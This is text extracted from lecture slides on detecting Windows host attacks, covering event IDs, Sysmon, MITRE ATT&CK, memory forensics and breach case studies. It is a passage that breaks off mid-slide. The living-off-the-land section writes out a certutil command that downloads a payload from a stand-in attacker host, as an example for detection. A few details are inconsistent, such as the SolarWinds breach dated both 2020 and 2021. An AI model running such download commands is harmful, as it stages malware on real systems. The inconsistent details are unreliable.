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 id="340" r:id="rId96"/>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19, "Detecting Device Attacks." In our previous sessions, we focused on preventive controls: host hardening, access control policies, and authentication. While these controls reduce risk, they are not infallible. A sophisticated adversary can bypass them by using zero-day exploits, compromised administrative credentials, or social engineering.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Today, we will focus on detection, which serves as a critical backstop in security operations. We will analyze endpoint detection through SANS digital forensics guidelines and the MITRE ATT&amp;CK framework. We will examine how system telemetry, collected via Windows Event Logs and Microsoft Sysmon, is used to identify unauthorized activity. We will study the "Pyramid of Pain" to understand the difference between static file indicators and behavioral indicators. Finally, we will cover RFC 3227 standards for digital forensics, explaining how to preserve volatile evidence during an active investigation. Let's begin by discussing why we must transition to an "assume breach" mindset.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>According to the Mandiant M-Trends 2023 report, the median attacker dwell time, the period between initial breach and detection, has decreased to 16 days globally; however, in organizations without mature detection programs, dwell times can extend to months. This statistic underscores the operational value of the telemetry and detection methods we will cover today. The National Institute of Standards and Technology (NIST) Special Publication 800-137, Information Security Continuous Monitoring (ISCM) for Federal Information Systems and Organizations, provides the foundational framework for the continuous monitoring approach we will study. Additionally, the MITRE ATT&amp;CK framework, a globally recognized knowledge base of adversary tactics and techniques, will serve as our reference for mapping observed behaviors to attacker goals throughout this class. The 2020 SolarWinds supply chain compromise, in which the SUNBURST backdoor evaded prevention controls for months, is a landmark case study demonstrating why detection is an essential, not optional, security capability.</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For many years, cybersecurity focused primarily on prevention. The goal was to build strong firewalls and enforce strict access policies to keep attackers out. However, modern security architectures, including Zero Trust (NIST SP 800-207), operate under the assumption that perimeters will fail. This is known as the "Assume Breach" mindset.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Prevention can fail for several reasons. Attackers may use zero-day exploits that bypass patches, or abuse valid credentials stolen through phishing. Once inside, they often use "Living off the Land" techniques, executing commands using built-in tools like PowerShell or Windows Management Instrumentation (WMI). Because these tools are legitimate, their execution does not trigger standard access blocks. Consequently, organizations must deploy continuous monitoring to identify anomalous behavior, focusing on reducing dwell time, the duration an attacker remains undetected, to minimize potential damage.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The concept of Zero Trust was formalized by NIST in SP 800-207 (published August 2020), which mandates that all access requests be authenticated and authorized regardless of their network origin. This architecture assumes that neither the internal network nor the endpoint device is inherently trusted. Living off the Land (LoTL) attacks demonstrate why this matters: in the 2021 Colonial Pipeline ransomware attack, attackers gained initial access via a compromised VPN credential and moved laterally using legitimate remote desktop tools, no custom malware was necessary. MITRE ATT&amp;CK categorizes these techniques as T1059.001 (PowerShell) and T1047 (Windows Management Instrumentation). Industry data from CrowdStrike's 2023 Global Threat Report indicates that 71 percent of detected attacks involved malware-free techniques, relying entirely on legitimate tools. This makes behavioral analysis, identifying what tools are doing rather than what they are, the essential component of a modern detection program.</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detect host-level attacks, security teams need visibility into operating system activity. This visibility is built on endpoint telemetry, which is compiled from system logs. In a Windows environment, this telemetry is gathered through the Windows Event Log service, which organizes events into Security, System, and Application logs.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For example, the Security log records logon events, such as Event ID 4624. Monitoring this log helps identify credential abuse, such as anomalous login times. However, because standard Event Logs may lack detail on process actions, security teams often install Microsoft Sysmon. Sysmon provides granular logging, capturing command-line details and file hashes for new processes. If a command-line utility attempts to access system memory, Sysmon logs the event, giving security operations center (SOC) analysts the data needed to identify and investigate potential compromises.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST Special Publication 800-92, Guide to Computer Security Log Management, establishes baseline requirements for log generation, storage, and analysis in enterprise environments. It recommends retaining security logs for a minimum of ninety days, with long-term archival of twelve months or more for compliance-sensitive systems. In practice, raw Windows Event Logs lack the detail required for advanced threat detection. For example, Security Event 4688 (Process Creation) requires additional audit policy configuration to include command-line arguments. Microsoft Sysmon fills this gap by using a kernel-mode driver to intercept process creation at a lower level, capturing full command-line arguments, parent process GUIDs, and PE file hashes automatically. These Sysmon events are then forwarded via Windows Event Forwarding (WEF) or a SIEM agent to a centralized Security Information and Event Management (SIEM) system. The 2013 Target data breach serves as a cautionary example: security monitoring tools flagged anomalous network traffic from the point-of-sale systems, but alerts were not acted upon in time, resulting in the theft of forty million payment card records. MITRE ATT&amp;CK data sources DS0009 (Process) and DS0029 (Network Traffic) map directly to the Sysmon event types covered in this slide.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 Indicator of Compromise (IOC) is a forensic artifact that suggests unauthorized access. These indicators include file hashes, IP addresses, registry keys, and behavioral patterns. To evaluate the effectiveness of these indicators, security teams use David Bianco's Pyramid of Pain.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The pyramid organizes indicators by the effort required for an attacker to change them when detected. At the bottom are hash values, which are trivial for an attacker to change by altering a single byte of code. IPs and domain names are also relatively easy to rotate. Consequently, defenses that rely solely on these indicators are easily bypassed. At the top of the pyramid are TTPs, Tactics, Techniques, and Procedures. TTPs represent the attacker's behavioral patterns, such as using process injection to execute code. Defending at the TTP level is highly effective because changing these patterns requires the attacker to rewrite their tools and retrain their staff, which is challenging and time-consuming.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Pyramid of Pain was published by David Bianco in 2013 and has since become a cornerstone of threat intelligence programs. The sharing of IOC data across organizations is standardized by two specifications: Structured Threat Information eXpression (STIX) for representing threat data, and Trusted Automated eXchange of Intelligence Information (TAXII) as the transport protocol. These allow security teams to receive curated threat feeds and automatically block known-bad indicators. However, as the Pyramid illustrates, TTP-level defenses are far more durable. When the Russian GRU-linked group APT28 (also tracked as Fancy Bear) was detected during the 2016 Democratic National Committee breach, their infrastructure IPs and domains changed rapidly. What persisted were their TTPs, spear-phishing with credential harvesting pages and custom X-Agent implants. Security teams that detected these behavioral patterns could identify and block APT28 activity even after the group cycled through new infrastructure. CVE-2017-0144 (EternalBlue), exploited by WannaCry, is a case where IP blocking was ineffective; detecting the underlying SMB exploit behavior (MITRE ATT&amp;CK T1210 Exploitation of Remote Services) was the only scalable defense.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table details common host-based indicators of compromise, mapping system events to the MITRE ATT&amp;CK framework. SOC analysts monitor these indicators to identify attacks in progress.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For example, process creation monitoring can reveal unauthorized activity. A standard user opening Microsoft Word should spawn a Word process. If that Word process spawns a command shell (cmd.exe) which then executes network commands, this behavior is a strong indicator of a macro-based exploit. Similarly, Service Installation (System Event ID 7045) must be monitored; attackers often create services to run malicious payloads with system-level privileges. Another critical indicator is Log Clearing (Security Event ID 1102). A user rarely has a legitimate reason to clear system logs; when this occurs, it typically indicates an attacker attempting to hide their traces during an active compromise.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Mapping host events to MITRE ATT&amp;CK provides a systematic framework for alert prioritization. The process creation anomaly described, winword.exe spawning cmd.exe, matches CVE-2017-11882, a buffer overflow in the Microsoft Office Equation Editor that was widely exploited to deliver malware payloads via spear-phishing documents. MITRE ATT&amp;CK classifies this pattern under T1203 (Exploitation for Client Execution) within the Execution tactic. Account creation (Event ID 4720) must be correlated with change management records; the 2014 Anthem Health Insurance breach involved attackers creating administrative accounts over months before exfiltrating over seventy-eight million patient records. Service installation (Event ID 7045) is used by attackers to achieve persistence with SYSTEM-level privileges, mapped to MITRE ATT&amp;CK T1543.003 (Create or Modify System Process: Windows Service). Most critically, Log Clearing (Event ID 1102) was documented in the 2017 NotPetya destructive attack: before deploying its wiper payload, the malware cleared Windows Event Logs to delay forensic analysis. Any detection of this event should be treated as a high-severity incident indicator requiring immediate CSIRT activation.</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a system compromise is detected, the initial response is critical. A common mistake is to reboot or power down the system. While this may stop malware execution, it destroys volatile evidence needed to understand the scope and origin of the breach.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>To prevent this, digital forensics specialists follow RFC 3227 guidelines, which establish the Order of Volatility. This order dictates that investigators must capture the most volatile data first. The most critical volatile asset is physical RAM. Memory contains active network connections, running processes, and sometimes decrypted cryptographic keys or passwords. Wiping this data makes it difficult to determine how the attacker gained access. Therefore, responders use specialized tools to capture a memory image before performing persistent disk analysis or shutting down the machine.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The legal and procedural framework for digital evidence collection extends beyond RFC 3227. ISO/IEC 27037:2012 (Information Technology, Security Techniques, Guidelines for Identification, Collection, Acquisition, and Preservation of Digital Evidence) provides an internationally recognized standard for maintaining the admissibility of digital evidence in legal proceedings. A core principle is chain of custody, a chronological log that records who handled the evidence, when, and why. Breaks in this chain can render evidence inadmissible in court. Practical memory acquisition is performed using tools such as WinPMEM (open source) or Magnet RAM Capture, which create bit-for-bit copies of physical RAM without requiring elevated privileges. These images are then analyzed using the Volatility Framework, an open-source tool that can extract running processes, network connections, and encryption keys from raw memory dumps. Fileless malware, such as the PowerShell-based Kovter trojan (MITRE ATT&amp;CK T1059.001, T1055 Process Injection), exists entirely in RAM and leaves no persistent disk artifacts, making memory acquisition the only viable forensic path. NIST SP 800-86 (Guide to Integrating Forensic Techniques into Incident Response) provides operational guidelines for combining forensic procedures with active incident response workflows.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audit system integrity efficiently, administrators deploy scripts that automate log analysis. These scripts query critical system directories and registry paths for unauthorized modifications.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The PowerShell script shown here audits registry locations that control startup behavior. Attackers frequently use these registry keys to maintain persistence, ensuring their malware launches automatically when the system boots. By running automated audits on these keys, security teams can identify unauthorized executables, verify administrative changes, and detect compromises before they escalate.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-92 (Guide to Computer Security Log Management) recommends that organizations implement automated log analysis tools to reduce analyst workload and decrease mean time to detect (MTTD). The PowerShell script demonstrated on this slide specifically targets registry Run keys, which are mapped to MITRE ATT&amp;CK T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder) under the Persistence tactic (TA0003). Maintaining registry run key persistence was a documented technique used by the SUNBURST backdoor in the 2020 SolarWinds supply chain attack, where the malware registered itself to execute on system startup. Automated auditing of these keys against a known-good baseline would have been an effective detection method. Beyond registry run keys, security analysts should script audits of complementary persistence mechanisms, including Scheduled Tasks (Event ID 4698), WMI event subscriptions (MITRE ATT&amp;CK T1546.003), and startup folder contents. The Sysinternals Autoruns utility, developed by Mark Russinovich, provides a comprehensive GUI-based view of all Windows persistence mechanisms and is a common first-response tool for analysts. To ensure PowerShell scripts themselves are auditable, organizations should enable PowerShell Script Block Logging (configured via Group Policy) and Module Logging, which capture the complete text of all executed PowerShell commands in the Windows Event Log under the Microsoft-Windows-PowerShell/Operational channel (Event ID 4104). This provides a secondary layer of detection for attackers who use PowerShell to modify persistence keys programmatically.</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Windows generates thousands of event log entries per hour on a busy enterprise system. Security analysts cannot review every entry manually. This slide provides a curated reference of the event IDs that carry the highest forensic signal, the ones worth building detection rules around first.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Let us walk through some of the most operationally important entries. Event ID 4624 (successful logon) is logged every time a user authenticates. On its own, it is noise. However, filtering for Logon Type 3 (network logon) from a workstation account, rather than a service account, at 3:00 AM is a very different story. This pattern matches lateral movement behavior where an attacker with stolen credentials authenticates to file shares or remote systems. MITRE ATT&amp;CK T1078 (Valid Accounts) covers this technique precisely. The 2021 Hafnium Microsoft Exchange exploitation campaign relied heavily on network logons using compromised service account credentials, which would have been detectable via Event ID 4624 correlation with Logon Type 3 and non-standard source IPs.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Event IDs 4768 and 4769, related to Kerberos ticket requests, are the primary detection point for Kerberoasting attacks (MITRE ATT&amp;CK T1558.003). In a Kerberoasting attack, an attacker requests service tickets for accounts with Service Principal Names (SPNs) registered in Active Directory, then cracks the ticket offline to recover the service account password. The detection signature is a single user account requesting an unusually large number of TGS tickets in a short time window, something that does not occur during normal operations. Tools like BloodHound and Rubeus are commonly used to automate this attack.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Event ID 4776, NTLM credential validation, is the key detection point for pass-the-hash attacks (MITRE ATT&amp;CK T1550.002) and NTLM relay attacks (T1557.001). Organizations should monitor for NTLM authentication to domain controllers from workstations, a pattern that should be rare in modern Kerberos-configured environments.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Which three Windows event IDs are worth monitoring above all others has no single answer; it depends on the organization's threat model, which is itself the point, prioritization must follow the threats that matter to a given environment.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-92 section 4.3 recommends that organizations document their critical event IDs in a log management policy and configure SIEM correlation rules for each. The SANS Windows Event Log Cheat Sheet, updated annually, is a practical field reference that expands this list significantly.</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Microsoft Sysmon, the System Monitor utility from Sysinternals, operates as a kernel-mode Windows service that intercepts system calls and logs security-relevant events before they can be tampered with by user-mode processes. This architectural position makes it significantly harder for attackers to evade compared to user-mode logging agents.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>However, a default Sysmon installation with no configuration file generates an enormous volume of events, often hundreds of thousands per hour on a busy workstation. Without a configuration file defining inclusion and exclusion rules, this volume makes SIEM storage cost prohibitive and buries true positives under false positives. The cybersecurity community has responded by developing open-source Sysmon configuration rulesets. The most widely adopted is the SwiftOnSecurity Sysmon configuration (github.com/SwiftOnSecurity/sysmon-config), which provides a carefully curated set of inclusion rules that capture high-value events while excluding known-good system processes. The Olaf Hartong modular Sysmon configuration extends this further with MITRE ATT&amp;CK-tagged rule comments.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Let us focus on the highest-value Sysmon event types. Event ID 8 (CreateRemoteThread) captures the most important signal for process injection, MITRE ATT&amp;CK T1055. In a legitimate system, processes rarely create threads inside other processes. When malware injects code into a trusted process like lsass.exe or svchost.exe to execute under that process's security context, Event ID 8 captures the source and target process IDs, providing a direct forensic record. The 2017 WannaCry ransomware used process injection extensively to evade detection; Sysmon Event ID 8 would have flagged this behavior even before the ransomware executed its encryption payload.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Event ID 22 (DNS Query) is particularly valuable for detecting command-and-control (C2) beaconing. When malware resolves its C2 server's domain name, Sysmon captures the query and the process that initiated it. A legitimate browser process resolving news.bbc.co.uk is expected. PowerShell.exe resolving a newly registered domain with a high entropy name (e.g., xk3mf7.xyz) at regular five-minute intervals is not. This pattern matches MITRE ATT&amp;CK T1071.004 (Application Layer Protocol: DNS) used for C2 communication.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>With a tool like Sysmon, most of the operational value comes from the quality of the XML configuration rather than the tool itself; a new configuration can be applied without a reboot, so tuning is continuous.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host-based telemetry provides visibility into what is happening on a single machine, network-based indicators reveal the broader attack campaign. Attackers must communicate: they need to receive commands from their infrastructure, and ultimately they need to exfiltrate data. Every one of these communications creates a network artifact that can be detected.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Beaconing is the most reliable network-based indicator for identifying active malware. Most command-and-control frameworks, including Cobalt Strike, Empire, and Metasploit, implement a "sleep and callback" pattern where the implant sleeps for a configured interval then reaches out to the C2 server to check for new commands. This creates a periodic pattern in netflow data that statistical analysis can surface. Security teams analyzing netflow data look for endpoints making connections to the same external IP at suspiciously regular intervals. The Cobalt Strike framework, widely used by both red teams and threat actors, defaults to a 60-second beacon interval. The 2021 SolarWinds breach used a fourteen-day dormancy period before SUNBURST would begin C2 communication, a deliberate attempt to avoid short-term behavioral analysis.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>DNS tunneling is a sophisticated exfiltration technique where data is encoded into DNS query subdomains. Since most organizations allow DNS traffic outbound through their firewall to support name resolution, DNS tunneling can bypass conventional firewall rules entirely. Tools like DNScat2 and Iodine implement this technique. Detection requires analyzing the length and entropy of DNS query strings, legitimate domain labels are short and human-readable, while encoded payloads are long and high-entropy. NIST SP 800-81-2 (Secure Domain Name System Deployment Guide) recommends implementing DNS Response Policy Zones (RPZ) and DNS logging to support detection of this technique.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For lateral movement detection, one of the most reliable signatures is a workstation initiating SMB connections (TCP port 445) to multiple other internal hosts in rapid succession. This behavior is characteristic of worm-like lateral movement (MITRE ATT&amp;CK T1021.002 SMB/Windows Admin Shares) and was the primary propagation mechanism for both WannaCry (CVE-2017-0144) and NotPetya in 2017. Internal firewall rules, sometimes called "east-west" controls, that restrict workstation-to-workstation SMB communication are a highly effective countermeasure.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Attackers run command-and-control over encrypted HTTPS to blend in with normal web traffic. This is why encrypted traffic analysis and JA3 TLS fingerprinting matter: they identify the TLS handshake characteristics of known malware frameworks even when the payload itself cannot be read.</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MITRE ATT&amp;CK, Adversarial Tactics, Techniques, and Common Knowledge, was created by MITRE Corporation and first published in 2015, drawing on observations from real-world cyber intrusions. It has since become the de facto standard language for describing attacker behavior in threat intelligence reports, detection engineering, and red team assessments.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The framework organizes adversary behavior into fourteen tactics, which represent the "why" of an attacker's action, the goal they are trying to achieve. Under each tactic are techniques, which describe "how" the goal is achieved. Many techniques have sub-techniques that provide even more specificity. As of 2024, the ATT&amp;CK Enterprise matrix contains over two hundred unique techniques and more than four hundred sub-techniques, each documented with procedure examples from real threat actor campaigns, detection guidance, and mitigation recommendations.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Understanding the tactic sequence is operationally important. Attacks typically progress left-to-right through the matrix: an attacker gains Initial Access, establishes Execution, achieves Persistence, then moves through Privilege Escalation and Defense Evasion before beginning Credential Access and Lateral Movement. This sequence creates detection opportunities at each stage. The earlier in the sequence a detection fires, the less damage an attacker can cause. A detection at Initial Access (phishing email) prevents all subsequent tactics. A detection at Exfiltration means the attacker has already achieved most of their goals. This is why NIST CSF DE.CM controls emphasize early-stage detection.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>One of the most powerful uses of ATT&amp;CK is the ATT&amp;CK Navigator, a web-based tool that allows security teams to color-code their detection coverage across the entire matrix. Teams mark techniques in green where they have detection rules, yellow where they have partial coverage, and red where they have no visibility. This "heat map" view immediately identifies coverage gaps. For example, many organizations have excellent coverage of Execution-phase techniques (they monitor process creation) but poor coverage of Collection and Staging (T1074) because they do not monitor file system activity in user directories. The Navigator exercise is a recommended lab activity for this unit.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Layering several threat groups' technique profiles in the ATT&amp;CK Navigator reveals which techniques are used by multiple actors; those shared techniques are the highest-priority detection targets.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Living Off the Land is one of the most significant trends in modern threat actor behavior. Rather than deploying custom malware that antivirus and EDR products may recognize, sophisticated attackers use tools that are already installed on every Windows system. Because these tools are signed by Microsoft and are used regularly by IT administrators, their presence alone does not indicate malicious activity.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>PowerShell is the most widely abused LoTL tool. An attacker with code execution privileges can use PowerShell to download additional payloads, enumerate Active Directory, harvest credentials from memory using a port of Mimikatz, and establish encrypted C2 channels, all using built-in cmdlets. The defense against PowerShell abuse is not disabling PowerShell, which would break legitimate administration, but rather enabling comprehensive PowerShell logging: Script Block Logging (Event ID 4104), Module Logging, and PowerShell Transcription. Together these logs capture the complete text of every PowerShell command executed, making malicious use visible even when obfuscation techniques are employed. MITRE ATT&amp;CK T1059.001 documents dozens of real-world PowerShell abuse procedures from groups including APT29, Lazarus Group, and FIN7.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>WMI (Windows Management Instrumentation) provides an especially dangerous persistence mechanism through WMI event subscriptions (MITRE ATT&amp;CK T1546.003). An attacker can create a WMI subscription that executes a payload whenever a specific system event occurs, such as when a user logs on, or every thirty minutes. These subscriptions persist across reboots and are stored in the WMI repository (C:\Windows\System32\wbem\Repository), not the registry, meaning standard registry persistence monitoring will miss them. Detection requires querying the WMI repository for __EventFilter, __EventConsumer, and __FilterToConsumerBinding objects and comparing them against a known baseline.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Certutil.exe abuse deserves particular attention in training environments. The command certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe downloads an arbitrary file from the internet and saves it to disk, entirely using a signed Microsoft binary. This technique was used in multiple 2019-2020 campaigns by the Lazarus Group for payload staging. Detection requires monitoring certutil.exe process creation (Sysmon Event ID 1) and flagging any execution that includes URL parameters.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A living-off-the-land download abuses a built-in, signed Windows utility (for example certutil, whose legitimate purpose is certificate management) to fetch a payload. Antivirus does not flag it because the binary is trusted and signed; catching it requires behavioral analysis of the command-line arguments, not signature matching.</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Memory forensics is the practice of analyzing the contents of a system's physical RAM to recover forensic evidence that would be lost if the system were powered off. It is an essential capability for investigating fileless malware, process injection, and active attacker sessions.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Volatility Framework, created by Aaron Walters and released in 2007, has become the industry-standard open-source tool for memory analysis. It supports memory images from Windows, Linux, and macOS and provides over one hundred plugins covering every aspect of memory analysis. The framework operates on raw memory images acquired using tools like WinPMEM (open source, created by Michael Cohen) or commercial tools like Magnet RAM Capture and FTK Imager.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The most forensically valuable Volatility plugins for threat detection are pslist/pstree, netscan, and malfind. The pslist plugin extracts the list of running processes from the EPROCESS kernel data structure. When compared against psscan (which scans raw memory for EPROCESS structures regardless of the active process list), discrepancies indicate hidden processes, a technique called Direct Kernel Object Manipulation (DKOM), used by rootkits to conceal themselves. This maps to MITRE ATT&amp;CK T1014 (Rootkit).</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The netscan plugin is particularly powerful for active compromise scenarios. It recovers TCP and UDP connection structures from memory, including connections that were closed shortly before the memory capture. This allows investigators to identify C2 server IP addresses and ports even if the attacker's malware has already disconnected. The malfind plugin implements a detection heuristic: it identifies memory regions that have executable (PAGE_EXECUTE) or execute-write permissions, do not map to a file on disk, and contain sequences of bytes that resemble a PE header (MZ magic bytes). This is the primary detection for reflective DLL injection, the technique used by Metasploit Meterpreter and Cobalt Strike Beacon to inject payloads into memory without touching disk. CVE-2021-34527 (PrintNightmare) was frequently exploited with reflective injection payloads; malfind would have detected the injected DLL in spoolsv.exe memory.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Memory forensics takes time to learn but is often the only source of actionable evidence against sophisticated actors using fileless techniques, whose artifacts exist only in RAM. Practice resources such as the MemLabs challenge build the skill.</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SUNBURST campaign is studied in every advanced security curriculum because it challenged assumptions about supply chain trust, detection capabilities, and organizational resilience simultaneously. Understanding this case in detail is essential for any security professional.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The initial compromise involved the insertion of malicious code into SolarWinds' build system, likely through a compromised developer credential or a build server vulnerability. The attackers modified the Orion software source to include the SUNBURST backdoor, which was then compiled, digitally signed with SolarWinds' legitimate code signing certificate, and distributed as a legitimate software update. This technique, MITRE ATT&amp;CK T1195.002 (Compromise Software Supply Chain), bypassed every endpoint protection product that trusted Microsoft Authenticode signatures as a validation mechanism.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The fourteen-day dormancy period was a deliberate countermeasure against behavioral detection tools. Many EDR and sandbox products analyze suspicious binaries for fourteen days of behavior. By waiting exactly this period before activating, the attackers ensured that automated behavioral analysis would conclude the software was benign before C2 activity began. The C2 channel used DNS subdomain encoding, victim identifiers encoded as subdomains of avsvmcloud.com, making the traffic appear as normal DNS resolution rather than C2 communication. The GUID-based subdomain encoding was designed to avoid pattern matching on C2 domains.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The critical lesson from SUNBURST is how it was actually discovered. FireEye was investigating an anomalous second-factor authentication device registration on a privileged employee account, a host-based indicator (Security Event ID 4720 equivalent for Azure AD), when they uncovered the broader campaign. This was not a network detection or a signature match. It was a human analyst noticing an anomalous action in identity logs. The Pyramid of Pain explains this: SUNBURST evaded hash-based detection (new signatures), IP and domain blocking (generated unique subdomains), and tool detection (used legitimate binaries). The only detection path was TTP-level, identifying the behavioral anomaly of privileged account manipulation.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST IR 8276 (Key Practices in Cyber Supply Chain Risk Management) was updated following this incident to recommend software bill of materials (SBOM) requirements and build environment integrity verification. CVE-2020-10148 (SolarWinds Orion Authentication Bypass) was separately discovered and also requires patching in affected environments.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>FireEye's disclosure "Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor" is an exceptionally detailed technical account suited to close study.</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WannaCry outbreak of May 12, 2017 remains the most financially damaging ransomware event in recorded history, causing estimated losses of four to eight billion US dollars. Understanding its technical mechanism provides a concrete worked example of how multiple detection controls could have, and in some cases did, prevent infection.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The vulnerability at the heart of WannaCry is CVE-2017-0144, a heap buffer overflow in the Windows Server Message Block version 1 (SMBv1) protocol implementation. The exploit was developed by the NSA's Equation Group and leaked by the Shadow Brokers hacking group in April 2017. Microsoft had released a patch, MS17-010, in March 2017, five weeks before the WannaCry outbreak. Organizations that applied this patch were immune. The NHS (UK National Health Service) suffered catastrophic impact precisely because thousands of its systems were running unpatched Windows XP, an operating system whose mainstream support ended in 2014.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>WannaCry's self-propagation mechanism produced highly detectable network artifacts. After infecting a host, the malware spawned threads that scanned random external IP ranges and the local subnet on TCP port 445, attempting the EternalBlue exploit against every reachable host. A single infected workstation would generate thousands of outbound connection attempts per minute. In terms of the network IOCs discussed earlier in this class, this is an extreme version of the lateral movement SMB scanning pattern. Network monitoring tools analyzing NetFlow data would detect the connection volume anomaly within seconds.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>On the host, WannaCry produced two Sysmon detection opportunities. Sysmon Event ID 3 (Network Connect) would log the mass outbound SMB connections from a non-administrative process. Sysmon Event ID 11 (File Created) would generate thousands of events as the malware renamed encrypted files with the .WNCRY extension. The combination of mass network connections and mass file creation events simultaneously is a highly specific detection signature for ransomware worm behavior.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The accidental "kill switch" discovery by Marcus Hutchins (@MalwareTech) illustrates an unexpected defensive mechanism: WannaCry checked whether a specific long, nonsensical domain name was registered, and if it was, the malware exited. Hutchins registered the domain for ten dollars and stopped the spread. This behavior was a sandbox detection mechanism, malware authors sometimes check for internet connectivity as a sign that the sample is running in an automated analysis environment. Registering the domain converted this anti-sandbox check into a global kill switch.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The WannaCry kill switch was found by Marcus Hutchins while reverse-engineering the malware binary, the same skill malware authors use. The case raised lasting policy questions about vulnerability disclosure, the leakage of offensive cyber capabilities, and the ethics of security research.</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intelligence sharing addresses a fundamental asymmetry in cybersecurity: attackers share tools, techniques, and target lists across criminal forums, while defenders historically operated in organizational silos. STIX and TAXII were developed by MITRE and standardized through the OASIS standards body to enable systematic, machine-readable sharing of threat intelligence between organizations.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>STIX version 2.1 defines a JSON-based data model for representing threat intelligence as discrete "objects." The key object types for detection are Indicators and Attack Patterns. A STIX Indicator object contains a pattern written in STIX Pattern Language, for example, [file:hashes.'SHA-256' = 'abc123...'], along with metadata about when the indicator was valid, confidence level, and the threat context that generated it. An Attack Pattern object references a specific MITRE ATT&amp;CK technique, allowing threat intelligence producers to describe adversary behavior at the TTP level rather than just providing hash lists.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>TAXII defines the HTTP-based API through which STIX content is distributed. A TAXII server hosts one or more "collections", groupings of STIX objects that clients can query and subscribe to. Modern SIEMs, including Splunk, Microsoft Sentinel, and IBM QRadar, include native TAXII client capabilities that automatically poll configured feeds and translate STIX Indicator objects into detection rules.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
